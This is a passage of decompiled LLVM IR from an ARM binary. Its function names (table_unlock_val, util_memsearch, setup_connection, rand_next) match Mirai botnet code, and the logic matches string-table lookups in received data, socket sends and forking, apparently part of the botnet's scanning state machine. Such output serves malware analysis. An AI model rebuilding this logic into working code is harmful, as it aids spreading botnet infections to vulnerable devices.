  store i1 %v8_f7e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7e8, label %dec_label_pc_f92c, label %dec_label_pc_f7f0

dec_label_pc_f7f0:                                ; preds = %bb452
  %v2_f7f0 = icmp ugt i8 %v3_f7e0, 35
  store i1 %v2_f7f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7f0 = icmp eq i8 %v3_f7e0, 36
  store i1 %v7_f7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f0, label %dec_label_pc_f92c, label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f7f0
  %v2_f7f8 = icmp ugt i8 %v3_f7e0, 34
  store i1 %v2_f7f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7f8 = icmp eq i8 %v3_f7e0, 35
  store i1 %v7_f7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f8, label %dec_label_pc_f92c, label %dec_label_pc_f800

dec_label_pc_f800:                                ; preds = %dec_label_pc_f7f8
  %v2_f800 = icmp ugt i8 %v3_f7e0, 36
  store i1 %v2_f800, i1* %cpsr_c.global-to-local, align 1
  %v7_f800 = icmp eq i8 %v3_f7e0, 37
  store i1 %v7_f800, i1* %cpsr_z.global-to-local, align 1
  %v1_f804 = add i32 %v0_f804, -1
  store i32 %v1_f804, i32* %r3.global-to-local, align 4
  br i1 %v7_f800, label %dec_label_pc_f92c, label %dec_label_pc_f80c

dec_label_pc_f80c:                                ; preds = %dec_label_pc_f80c.preheader, %dec_label_pc_f800
  %v0_f804 = phi i32 [ %v2_f7d4, %dec_label_pc_f80c.preheader ], [ %v1_f804, %dec_label_pc_f800 ]
  %v0_f80c = phi i32 [ %v1_f79c, %dec_label_pc_f80c.preheader ], [ %v1_f80c, %dec_label_pc_f800 ]
  %v1_f80c = add i32 %v0_f80c, -1
  store i32 %v1_f80c, i32* %r1.global-to-local, align 4
  %v2_f80c = icmp ne i32 %v0_f80c, 0
  store i1 %v2_f80c, i1* %cpsr_c.global-to-local, align 1
  %v7_f80c = icmp eq i32 %v0_f80c, 1
  store i1 %v7_f80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f80c, label %dec_label_pc_f814, label %dec_label_pc_f7e0

dec_label_pc_f814:                                ; preds = %dec_label_pc_f80c, %dec_label_pc_f798
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f818 = call i32 @table_unlock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f820 = call i32 @table_unlock_val(i32 30)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_f830 = call i32 @table_retrieve_val(i32 29, i32* nonnull %stack_var_-60)
  store i32 %v3_f830, i32* @r4, align 4
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_f844 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_f848 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f844, 16777216
  %v1_f84c = sdiv i32 %sext, 16777216
  store i32 %v1_f84c, i32* @r5, align 4
  %v0_f850 = load i32, i32* @r4, align 4
  store i32 %v0_f850, i32* %r2.global-to-local, align 4
  %v1_f854 = add i32 %v3_f848, -1
  store i32 %v1_f854, i32* %r3.global-to-local, align 4
  %v0_f858 = load i32, i32* @sb, align 4
  store i32 %v0_f858, i32* %r0.global-to-local, align 4
  %v0_f85c = load i32, i32* @r6, align 4
  %v1_f85c = add i32 %v0_f85c, 24
  %v2_f85c = inttoptr i32 %v1_f85c to i32*
  %v3_f85c = load i32, i32* %v2_f85c, align 4
  store i32 %v3_f85c, i32* %r1.global-to-local, align 4
  %v4_f860 = call i32 @util_memsearch(i32 %v0_f858, i32 %v3_f85c, i32 %v0_f850, i32 %v1_f854)
  store i32 %v4_f860, i32* %r0.global-to-local, align 4
  %v2_f864 = icmp eq i32 %v4_f860, -1
  store i1 %v2_f864, i1* %cpsr_c.global-to-local, align 1
  %v7_f864 = icmp eq i32 %v4_f860, -1
  store i1 %v7_f864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f864, label %dec_label_pc_f874, label %dec_label_pc_f89c

dec_label_pc_f874:                                ; preds = %dec_label_pc_f814
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f874 = load i32, i32* %stack_var_-60, align 4
  %v0_f878 = load i32, i32* @r5, align 4
  store i32 %v0_f878, i32* %r2.global-to-local, align 4
  %v1_f87c = add i32 %v3_f874, -1
  store i32 %v1_f87c, i32* %r3.global-to-local, align 4
  %v0_f880 = load i32, i32* @sb, align 4
  store i32 %v0_f880, i32* %r0.global-to-local, align 4
  %v0_f884 = load i32, i32* @r6, align 4
  %v1_f884 = add i32 %v0_f884, 24
  %v2_f884 = inttoptr i32 %v1_f884 to i32*
  %v3_f884 = load i32, i32* %v2_f884, align 4
  store i32 %v3_f884, i32* %r1.global-to-local, align 4
  %v4_f888 = call i32 @util_memsearch(i32 %v0_f880, i32 %v3_f884, i32 %v0_f878, i32 %v1_f87c)
  store i32 %v4_f888, i32* %r0.global-to-local, align 4
  %v1_f88c = add i32 %v4_f888, 1
  store i32 %v1_f88c, i32* @r7, align 4
  %v2_f88c = icmp eq i32 %v4_f888, -1
  store i1 %v2_f88c, i1* %cpsr_c.global-to-local, align 1
  %v7_f88c = icmp eq i32 %v1_f88c, 0
  store i1 %v7_f88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f88c, label %dec_label_pc_fb50, label %dec_label_pc_f89c

dec_label_pc_f89c:                                ; preds = %dec_label_pc_f874, %dec_label_pc_f814
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f8a0 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f8a8 = call i32 @table_lock_val(i32 30)
  store i32 %v1_f8a8, i32* %r0.global-to-local, align 4
  %v0_f8ac = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8ac = icmp eq i32 %v0_f8ac, 0
  store i1 %v2_f8ac, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f8ac, 1
  br i1 %tmp453, label %dec_label_pc_f78c, label %dec_label_pc_f940

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f324
  store i32 %v2_f8bc, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1931c.207 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f8bc, i32* @r0, align 4
  store i32 %v2_f8d0, i32* @sl, align 4
  %v0_f8d4 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f8d0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19313.209 to i32), i32* @r1, align 4
  %v0_f8e4 = call i32 @memcpy()
  store i32 %v0_f8e4, i32* %r0.global-to-local, align 4
  %v0_f8e8 = load i32, i32* @r6, align 4
  %v1_f8e8 = add i32 %v0_f8e8, 24
  %v2_f8e8 = inttoptr i32 %v1_f8e8 to i32*
  %v3_f8e8 = load i32, i32* %v2_f8e8, align 4
  %v0_f8ec = load i32, i32* @r4, align 4
  %v1_f8ec = add i32 %v0_f8ec, 2
  store i32 %v1_f8ec, i32* %r2.global-to-local, align 4
  %v0_f8f0 = load i32, i32* @sb, align 4
  %v2_f8f0 = add i32 %v0_f8f0, %v3_f8e8
  store i32 %v2_f8f0, i32* @r3, align 4
  %v3_f8f4 = icmp uge i32 %v2_f8f0, %v1_f8ec
  store i1 %v3_f8f4, i1* %cpsr_c.global-to-local, align 1
  %v9_f8f4 = icmp eq i32 %v2_f8f0, %v1_f8ec
  store i1 %v9_f8f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f8f8 = xor i1 %v3_f8f4, true
  %v3_f8f8 = or i1 %v9_f8f4, %v2_f8f8
  br i1 %v3_f8f8, label %dec_label_pc_f8b8.dec_label_pc_f3a0.loopexit_crit_edge, label %dec_label_pc_f8fc

dec_label_pc_f8b8.dec_label_pc_f3a0.loopexit_crit_edge: ; preds = %dec_label_pc_f8b8
  %v0_f3a0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f3a0

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f8b8
  %v2_f8fc = inttoptr i32 %v1_f8ec to i8*
  %v3_f8fc = load i8, i8* %v2_f8fc, align 1
  %v4_f8fc = zext i8 %v3_f8fc to i32
  store i32 %v4_f8fc, i32* %r3.global-to-local, align 4
  %v2_f900 = icmp ugt i8 %v3_f8fc, 30
  store i1 %v2_f900, i1* %cpsr_c.global-to-local, align 1
  %v7_f900 = icmp eq i8 %v3_f8fc, 31
  store i1 %v7_f900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f900, label %dec_label_pc_fa30, label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %dec_label_pc_f8fc
  %v1_f908 = inttoptr i32 %v0_f8ec to i8*
  %v2_f908 = load i8, i8* %v1_f908, align 1
  %v3_f908 = zext i8 %v2_f908 to i32
  store i32 %v3_f908, i32* %r3.global-to-local, align 4
  %v2_f90c = icmp ugt i8 %v2_f908, -4
  store i1 %v2_f90c, i1* %cpsr_c.global-to-local, align 1
  %v7_f90c = icmp eq i8 %v2_f908, -3
  store i1 %v7_f90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f90c, label %.thread138, label %dec_label_pc_f91c

.thread138:                                       ; preds = %dec_label_pc_f908
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f908, align 1
  %v0_f918.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f918.pr.pr, label %dec_label_pc_f338, label %.thread138.dec_label_pc_f91cthread-pre-split_crit_edge

.thread138.dec_label_pc_f91cthread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f91c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f908, %.thread138.dec_label_pc_f91cthread-pre-split_crit_edge
  %v0_f91c.pr = phi i32 [ %v0_f91c.pr.pre, %.thread138.dec_label_pc_f91cthread-pre-split_crit_edge ], [ %v3_f908, %dec_label_pc_f908 ]
  %v2_f91c = icmp ugt i32 %v0_f91c.pr, 250
  store i1 %v2_f91c, i1* %cpsr_c.global-to-local, align 1
  %v7_f91c = icmp eq i32 %v0_f91c.pr, 251
  store i1 %v7_f91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f91c, label %bb454, label %dec_label_pc_f338

bb454:                                            ; preds = %dec_label_pc_f91c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f924 = load i32, i32* @r4, align 4
  %v4_f924 = inttoptr i32 %v3_f924 to i8*
  store i8 -3, i8* %v4_f924, align 1
  br label %dec_label_pc_f338

dec_label_pc_f92c:                                ; preds = %dec_label_pc_f7e0, %dec_label_pc_f800, %dec_label_pc_f7f8, %dec_label_pc_f7f0, %bb452, %dec_label_pc_f7cc, %dec_label_pc_f7a8, %dec_label_pc_f7c4, %dec_label_pc_f7bc, %bb451
  %v0_f930 = phi i32 [ %v1_f79c, %dec_label_pc_f7cc ], [ %v1_f79c, %dec_label_pc_f7a8 ], [ %v1_f79c, %dec_label_pc_f7c4 ], [ %v1_f79c, %dec_label_pc_f7bc ], [ %v1_f79c, %bb451 ], [ %v1_f80c, %bb452 ], [ %v1_f80c, %dec_label_pc_f7f0 ], [ %v1_f80c, %dec_label_pc_f7f8 ], [ %v1_f80c, %dec_label_pc_f800 ], [ %v1_f80c, %dec_label_pc_f7e0 ]
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f930 = add i32 %v0_f930, 1
  store i32 %v1_f930, i32* @r7, align 4
  %v1_f934 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f93c = call i32 @table_lock_val(i32 30)
  store i32 %v1_f93c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f940

dec_label_pc_f940:                                ; preds = %dec_label_pc_f89c, %dec_label_pc_f92c
  %v0_f940 = load i32, i32* @r6, align 4
  %v1_f940 = inttoptr i32 %v0_f940 to i32*
  %v2_f940 = load i32, i32* %v1_f940, align 4
  store i32 %v2_f940, i32* %r3.global-to-local, align 4
  %v1_f944 = add i32 %v0_f940, 4
  %v2_f944 = inttoptr i32 %v1_f944 to i32*
  %v3_f944 = load i32, i32* %v2_f944, align 4
  store i32 %v3_f944, i32* %r0.global-to-local, align 4
  %v1_f948 = add i32 %v2_f940, 12
  %v2_f948 = inttoptr i32 %v1_f948 to i8*
  %v3_f948 = load i8, i8* %v2_f948, align 1
  %v4_f948 = zext i8 %v3_f948 to i32
  store i32 %v4_f948, i32* %r2.global-to-local, align 4
  %v1_f94c = inttoptr i32 %v2_f940 to i32*
  %v2_f94c = load i32, i32* %v1_f94c, align 4
  store i32 %v2_f94c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f954 = call i32 @__libc_send(i32 %v3_f944, i32 %v2_f94c, i32 %v4_f948, i32 16384)
  store i32 %v4_f954, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f95c = load i32, i32* @r6, align 4
  %v1_f95c = add i32 %v0_f95c, 4
  %v2_f95c = inttoptr i32 %v1_f95c to i32*
  %v3_f95c = load i32, i32* %v2_f95c, align 4
  store i32 %v3_f95c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f968 = call i32 @__libc_send(i32 %v3_f95c, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 %v4_f968, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f970 = load i32, i32* @r6, align 4
  %v2_f970 = add i32 %v1_f970, 12
  %v3_f970 = inttoptr i32 %v2_f970 to i32*
  store i32 4, i32* %v3_f970, align 4
  br label %dec_label_pc_f78c

dec_label_pc_f978:                                ; preds = %dec_label_pc_f6e4, %dec_label_pc_f6fc, %dec_label_pc_f6f4, %bb448, %dec_label_pc_f6d0, %dec_label_pc_f6b4, %dec_label_pc_f6c8, %bb447
  %v0_f97c = phi i32 [ %v1_f6a8, %dec_label_pc_f6d0 ], [ %v1_f6a8, %dec_label_pc_f6b4 ], [ %v1_f6a8, %dec_label_pc_f6c8 ], [ %v1_f6a8, %bb447 ], [ %v1_f708, %bb448 ], [ %v1_f708, %dec_label_pc_f6f4 ], [ %v1_f708, %dec_label_pc_f6fc ], [ %v1_f708, %dec_label_pc_f6e4 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f97c = add i32 %v0_f97c, 1
  store i32 %v1_f97c, i32* @r7, align 4
  %v1_f980 = call i32 @table_lock_val(i32 28)
  br label %dec_label_pc_f758

dec_label_pc_f988:                                ; preds = %dec_label_pc_f094
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f994 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_f9a4 = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  store i32 %v3_f9a4, i32* %r0.global-to-local, align 4
  %v3_f9a8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f9a4, i32* %r2.global-to-local, align 4
  %v1_f9b0 = add i32 %v3_f9a8, -1
  store i32 %v1_f9b0, i32* %r3.global-to-local, align 4
  %v0_f9b4 = load i32, i32* @r6, align 4
  %v1_f9b4 = add i32 %v0_f9b4, 24
  %v2_f9b4 = inttoptr i32 %v1_f9b4 to i32*
  %v3_f9b4 = load i32, i32* %v2_f9b4, align 4
  store i32 %v3_f9b4, i32* %r1.global-to-local, align 4
  %v0_f9b8 = load i32, i32* @sb, align 4
  store i32 %v0_f9b8, i32* %r0.global-to-local, align 4
  %v4_f9bc = call i32 @util_memsearch(i32 %v0_f9b8, i32 %v3_f9b4, i32 %v3_f9a4, i32 %v1_f9b0)
  store i32 %v4_f9bc, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f9c8 = call i32 @table_lock_val(i32 11)
  store i32 %v1_f9c8, i32* %r0.global-to-local, align 4
  %v0_f9cc = load i32, i32* @r7, align 4
  %v2_f9cc = icmp eq i32 %v0_f9cc, -1
  store i1 %v2_f9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9cc = icmp eq i32 %v0_f9cc, -1
  store i1 %v7_f9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9cc, label %dec_label_pc_ef74.loopexit, label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f988
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9d4 = icmp eq i32 %v0_f9cc, 0
  store i1 %v2_f9d4, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f9cc, 1
  br i1 %tmp455, label %dec_label_pc_f78c, label %dec_label_pc_f9dc

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f9d4
  %v0_f9dc = load i32, i32* @r6, align 4
  %v1_f9dc = add i32 %v0_f9dc, 20
  %v2_f9dc = inttoptr i32 %v1_f9dc to i16*
  %v3_f9dc = load i16, i16* %v2_f9dc, align 2
  %v4_f9dc = zext i16 %v3_f9dc to i32
  store i32 %v4_f9dc, i32* %r3.global-to-local, align 4
  %v1_f9e0 = add i32 %v0_f9dc, 16
  %v2_f9e0 = inttoptr i32 %v1_f9e0 to i32*
  %v3_f9e0 = load i32, i32* %v2_f9e0, align 4
  store i32 %v3_f9e0, i32* %r2.global-to-local, align 4
  store i32 %v2_f9e4, i32* %ip.global-to-local, align 4
  store i32 %v4_f9dc, i32* %stack_var_-42, align 4
  store i32 %v3_f9e0, i32* %stack_var_-60, align 4
  %v1_f9f0 = inttoptr i32 %v0_f9dc to i32*
  %v2_f9f0 = load i32, i32* %v1_f9f0, align 4
  store i32 %v2_f9f0, i32* @r8, align 4
  %v0_f9f4 = call i32 @__libc_fork()
  store i32 %v0_f9f4, i32* %r0.global-to-local, align 4
  %v7_f9f8 = icmp eq i32 %v0_f9f4, -1
  %.465 = zext i1 %v7_f9f8 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa04 = icmp eq i32 %v0_f9f4, 0
  store i1 %v2_fa04, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f9f4, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f9dc
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fa18

bb459:                                            ; preds = %dec_label_pc_f9dc
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa10 = icmp eq i1 %v7_f9f8, false
  store i1 %v2_fa10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa10, label %dec_label_pc_fba0, label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %.thread144, %bb459
  %v0_fa18 = load i32, i32* @r6, align 4
  %v1_fa18 = add i32 %v0_fa18, 4
  %v2_fa18 = inttoptr i32 %v1_fa18 to i32*
  %v3_fa18 = load i32, i32* %v2_fa18, align 4
  store i32 %v3_fa18, i32* %r0.global-to-local, align 4
  %v1_fa1c = call i32 @__GI___libc_close(i32 %v3_fa18)
  store i32 %v1_fa1c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_fa24 = load i32, i32* @r4, align 4
  %v1_fa24 = load i32, i32* @r6, align 4
  %v2_fa24 = add i32 %v1_fa24, 4
  %v3_fa24 = inttoptr i32 %v2_fa24 to i32*
  store i32 %v0_fa24, i32* %v3_fa24, align 4
  %v0_fa28 = load i32, i32* @r3, align 4
  %v1_fa28 = load i32, i32* @r6, align 4
  %v2_fa28 = add i32 %v1_fa28, 12
  %v3_fa28 = inttoptr i32 %v2_fa28 to i32*
  store i32 %v0_fa28, i32* %v3_fa28, align 4
  br label %dec_label_pc_f78c

dec_label_pc_fa30:                                ; preds = %dec_label_pc_f8fc
  store i32 %v2_f8bc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_fa3c = add i32 %v0_f8e8, 4
  %v2_fa3c = inttoptr i32 %v1_fa3c to i32*
  %v3_fa3c = load i32, i32* %v2_fa3c, align 4
  store i32 %v3_fa3c, i32* %r0.global-to-local, align 4
  %v4_fa40 = call i32 @__libc_send(i32 %v3_fa3c, i32 %v2_f8bc, i32 3, i32 16384)
  store i32 %v4_fa40, i32* %r0.global-to-local, align 4
  %v0_fa44 = load i32, i32* @r6, align 4
  %v1_fa44 = add i32 %v0_fa44, 4
  %v2_fa44 = inttoptr i32 %v1_fa44 to i32*
  %v3_fa44 = load i32, i32* %v2_fa44, align 4
  store i32 %v3_fa44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f384

dec_label_pc_fa54:                                ; preds = %dec_label_pc_ef80
  store i32 %.pre282, i32* @r0, align 4
  %v1_fa5c = add i32 %v0_fa54, 92
  store i32 %v1_fa5c, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa64 = call i32 @memmove(i32 %.pre282, i32 %v1_fa5c, i32 192)
  store i32 %v3_fa64, i32* %r0.global-to-local, align 4
  %v0_fa68 = load i32, i32* @r6, align 4
  %v1_fa68 = add i32 %v0_fa68, 24
  %v2_fa68 = inttoptr i32 %v1_fa68 to i32*
  %v3_fa68 = load i32, i32* %v2_fa68, align 4
  %v1_fa6c = add i32 %v3_fa68, -64
  store i32 %v1_fa6c, i32* %r3.global-to-local, align 4
  store i32 %v1_fa6c, i32* %v2_fa68, align 4
  br label %dec_label_pc_ef90

dec_label_pc_fa78:                                ; preds = %dec_label_pc_f0d0
  %v0_fa78 = load i32, i32* @r6, align 4
  store i32 %v0_fa78, i32* @r0, align 4
  %v0_fa7c = call i32 @setup_connection()
  store i32 %v0_fa7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f10c

dec_label_pc_fa84:                                ; preds = %dec_label_pc_ef38
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e6a8, i32* %r3.global-to-local, align 4
  store i32 %v2_f828, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_faac = call i32 @getsockopt(i32 %v3_ef2c, i32 1, i32 4, i32 %v2_e6a8, i32 %v2_f828)
  %v3_fab0 = load i8, i8* %stack_var_-56, align 1
  %v4_fab0 = sext i8 %v3_fab0 to i32
  store i32 %v4_fab0, i32* %r3.global-to-local, align 4
  %v2_fab4 = or i32 %v4_fab0, %v5_faac
  store i32 %v2_fab4, i32* %r0.global-to-local, align 4
  %v4_fab4 = icmp eq i32 %v2_fab4, 0
  store i1 %v4_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fab4, label %dec_label_pc_fabc, label %dec_label_pc_fb68

dec_label_pc_fabc:                                ; preds = %dec_label_pc_fa84
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fac0 = load i32, i32* @r6, align 4
  %v2_fac0 = add i32 %v1_fac0, 12
  %v3_fac0 = inttoptr i32 %v2_fac0 to i32*
  store i32 2, i32* %v3_fac0, align 4
  %v0_fac4 = call i32 @rand_next()
  %v2_facc = load i16, i16* bitcast (i16** @global_var_21c50.145 to i16*), align 4
  %v3_facc = zext i16 %v2_facc to i32
  %v2_fad0 = udiv i32 %v0_fac4, %v3_facc
  %v3_fad0 = urem i32 %v0_fac4, %v3_facc
  store i32 %v2_fad0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21c20.141 to i32), i32* %r3.global-to-local, align 4
  %v2_fad8 = load i32, i32* @global_var_21c20.141, align 4
  store i32 %v2_fad8, i32* %ip.global-to-local, align 4
  %v1_fae0 = load i32, i32* @r4, align 4
  %v9_fae0 = icmp eq i32 %v2_fad8, %v1_fae0
  store i1 %v9_fae0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_fad0, i32* %r1.global-to-local, align 4
  %v7_fae8 = icmp sgt i32 %v2_fad8, %v1_fae0
  br i1 %v7_fae8, label %dec_label_pc_faec, label %dec_label_pc_fb2c

dec_label_pc_faec:                                ; preds = %dec_label_pc_fabc
  %v2_faf0 = load i32, i32* @global_var_21c4c.143, align 4
  store i32 %v2_faf0, i32* %r3.global-to-local, align 4
  store i32 %v1_fae0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fb0c

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fb1c, %dec_label_pc_fb0c
  %v1_fafc = add i32 %v0_fafc, 1
  store i32 %v1_fafc, i32* %r2.global-to-local, align 4
  %v9_fb00 = icmp eq i32 %v1_fafc, %v2_fad8
  %v1_fb04 = add i32 %v0_fb04, 16
  store i32 %v1_fb04, i32* %r3.global-to-local, align 4
  br i1 %v9_fb00, label %dec_label_pc_fb2c.loopexit, label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_faec
  %v0_fafc = phi i32 [ %v1_fafc, %dec_label_pc_fafc ], [ %v1_fae0, %dec_label_pc_faec ]
  %v0_fb04 = phi i32 [ %v1_fb04, %dec_label_pc_fafc ], [ %v2_faf0, %dec_label_pc_faec ]
  store i32 %v0_fb04, i32* %r0.global-to-local, align 4
  %v1_fb10 = add i32 %v0_fb04, 8
  %v2_fb10 = inttoptr i32 %v1_fb10 to i16*
  %v3_fb10 = load i16, i16* %v2_fb10, align 2
  %v4_fb10 = zext i16 %v3_fb10 to i32
  store i32 %v4_fb10, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_fb10, %v3_fad0
  br i1 %tmp460, label %dec_label_pc_fafc, label %dec_label_pc_fb1c

dec_label_pc_fb1c:                                ; preds = %dec_label_pc_fb0c
  %v1_fb1c = add i32 %v0_fb04, 10
  %v2_fb1c = inttoptr i32 %v1_fb1c to i16*
  %v3_fb1c = load i16, i16* %v2_fb1c, align 2
  %v4_fb1c = zext i16 %v3_fb1c to i32
  store i32 %v4_fb1c, i32* %r3.global-to-local, align 4
  %v3_fb20 = icmp uge i32 %v4_fb1c, %v3_fad0
  %v9_fb20 = icmp eq i32 %v4_fb1c, %v3_fad0
  %v2_fb24 = xor i1 %v3_fb20, true
  %v3_fb24 = or i1 %v9_fb20, %v2_fb24
  br i1 %v3_fb24, label %dec_label_pc_fafc, label %dec_label_pc_fb30.loopexit

dec_label_pc_fb2c.loopexit:                       ; preds = %dec_label_pc_fafc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb2c.loopexit, %dec_label_pc_fabc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb30

dec_label_pc_fb30.loopexit:                       ; preds = %dec_label_pc_fb1c
  store i1 %v3_fb20, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb30.loopexit, %dec_label_pc_fb2c
  %v0_fb44 = phi i32 [ %v0_fb04, %dec_label_pc_fb30.loopexit ], [ 0, %dec_label_pc_fb2c ]
  %v0_fb30 = load i32, i32* @r6, align 4
  %v1_fb30 = add i32 %v0_fb30, 4
  %v2_fb30 = inttoptr i32 %v1_fb30 to i32*
  %v3_fb30 = load i32, i32* %v2_fb30, align 4
  %v3_fb34 = udiv i32 %v3_fb30, 32
  store i32 %v3_fb34, i32* %r2.global-to-local, align 4
  %v1_fb38 = urem i32 %v3_fb30, 32
  store i32 %v1_fb38, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fb3c = mul nuw nsw i32 %v3_fb34, 4
  store i32 %v3_fb3c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fb44 = inttoptr i32 %v0_fb30 to i32*
  store i32 %v0_fb44, i32* %v2_fb44, align 4
  %v0_fb48 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb48 = load i32, i32* @r6, align 4
  %v2_fb48 = add i32 %v1_fb48, 24
  %v3_fb48 = inttoptr i32 %v2_fb48 to i32*
  store i32 %v0_fb48, i32* %v3_fb48, align 4
  %v0_ef60.pre = load i32, i32* @ip, align 4
  %v1_ef68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef5c

dec_label_pc_fb50:                                ; preds = %dec_label_pc_f874
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_fb54 = call i32 @table_lock_val(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
